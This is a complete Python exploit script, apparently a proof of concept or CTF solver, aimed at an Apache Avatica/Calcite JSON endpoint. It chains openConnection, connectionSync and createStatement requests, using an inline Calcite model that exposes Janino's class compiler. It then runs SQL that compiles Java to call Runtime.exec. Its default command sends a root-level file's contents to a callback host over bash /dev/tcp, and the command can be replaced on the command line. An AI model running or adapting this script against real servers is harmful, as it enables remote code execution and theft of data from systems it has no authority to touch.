#!/usr/bin/env python3
import argparse
import json
import sys
import urllib.error
import urllib.request


MODEL = (
    "inline:{version:1,schemas:[{name:0,functions:["
    "{className:'org.codehaus.commons.compiler.samples.DemoBase',methodName:'*'},"
    "{className:'org.codehaus.janino.ClassBodyEvaluator',methodName:'*'}"
    "]}]}"
)

MAX_JSON_LENGTH = 280


def compact_json(obj):
    return json.dumps(obj, separators=(",", ":"))


def java_string(value):
    return value.replace("\\", "\\\\").replace('"', '\\"')


def build_prefix_requests():
    return [
        {
            "request": "openConnection",
            "connectionId": "",
            "info": {
                "jdbcUrl": "jdbc:calcite:model=" + MODEL,
            },
        },
        {
            "request": "connectionSync",
            "connectionId": "",
            "connProps": {
                "connProps": "connPropsImpl",
                "schema": "0",
            },
        },
        {
            "request": "createStatement",
            "connectionId": "",
        },
    ]


def build_execute_request(command, statement_id=0):
    body = (
        '{try{Runtime.getRuntime().exec("'
        + java_string(command)
        + '");}catch(Exception e){}}'
    )
    sql = (
        "select createInstance(createObject(stringToType('java.io.StringReader'),'"
        + body
        + "'))"
    )
    return {
        "request": "prepareAndExecute",
        "connectionId": "",
        "statementId": statement_id,
        "sql": sql,
        "maxRowsInFirstFrame": -1,
    }


def build_requests(command, statement_id=0):
    return build_prefix_requests() + [build_execute_request(command, statement_id)]


def build_close_request():
    return {
        "request": "closeConnection",
        "connectionId": "",
    }


def post_json(endpoint, payload):
    data = payload.encode()
    request = urllib.request.Request(
        endpoint,
        data=data,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(request, timeout=5) as response:
            return response.status, response.read().decode(errors="replace")
    except urllib.error.HTTPError as error:
        return error.code, error.read().decode(errors="replace")


def main():
    parser = argparse.ArgumentParser(
        description="Send the compact Avatica JSON exploit chain directly."
    )
    parser.add_argument("url", help="Avatica endpoint, e.g. http://127.0.0.1:8080/")
    parser.add_argument(
        "host",
        nargs="?",
        default="host.docker.internal",
        help="Callback host used by /dev/tcp",
    )
    parser.add_argument("port", nargs="?", default="5555", help="Callback port")
    parser.add_argument(
        "--cmd",
        help="Override command. Default: bash -c /r*>/dev/tcp/<host>/<port>",
    )
    parser.add_argument(
        "--print-only",
        action="store_true",
        help="Only print JSON payloads and lengths.",
    )
    args = parser.parse_args()

    endpoint = args.url.rstrip("/") + "/"
    command = args.cmd or f"bash -c /r*>/dev/tcp/{args.host}/{args.port}"

    if args.print_only:
        payloads = [compact_json(item) for item in build_requests(command)]
        for index, payload in enumerate(payloads, 1):
            length = len(payload.encode())
            print(f"[{index}] len={length}", file=sys.stderr)
            print(payload)
            if length > MAX_JSON_LENGTH:
                raise SystemExit(f"payload {index} exceeds {MAX_JSON_LENGTH} bytes")
        return

    prefix_payloads = [compact_json(item) for item in build_prefix_requests()]
    for index, payload in enumerate(prefix_payloads, 1):
        length = len(payload.encode())
        print(f"[{index}] len={length}", file=sys.stderr)
        print(payload)
        if length > MAX_JSON_LENGTH:
            raise SystemExit(f"payload {index} exceeds {MAX_JSON_LENGTH} bytes")
        status, response = post_json(endpoint, payload)
        print(f"[{index}] HTTP {status}", file=sys.stderr)
        if index == 1 and status != 200 and "Connection already exists" in response:
            close_payload = compact_json(build_close_request())
            print(f"[cleanup] len={len(close_payload.encode())}", file=sys.stderr)
            cleanup_status, _ = post_json(endpoint, close_payload)
            print(f"[cleanup] HTTP {cleanup_status}", file=sys.stderr)
            status, response = post_json(endpoint, payload)
            print(f"[{index}] retry HTTP {status}", file=sys.stderr)
        if status != 200:
            raise SystemExit(response)
        if index == 3:
            statement_id = json.loads(response)["statementId"]

    execute_payload = compact_json(build_execute_request(command, statement_id))
    execute_length = len(execute_payload.encode())
    print(f"[4] len={execute_length}", file=sys.stderr)
    print(execute_payload)
    if execute_length > MAX_JSON_LENGTH:
        raise SystemExit(f"payload 4 exceeds {MAX_JSON_LENGTH} bytes")
    status, response = post_json(endpoint, execute_payload)
    print(f"[4] HTTP {status}", file=sys.stderr)
    print(response[:500], file=sys.stderr)


if __name__ == "__main__":
    main()
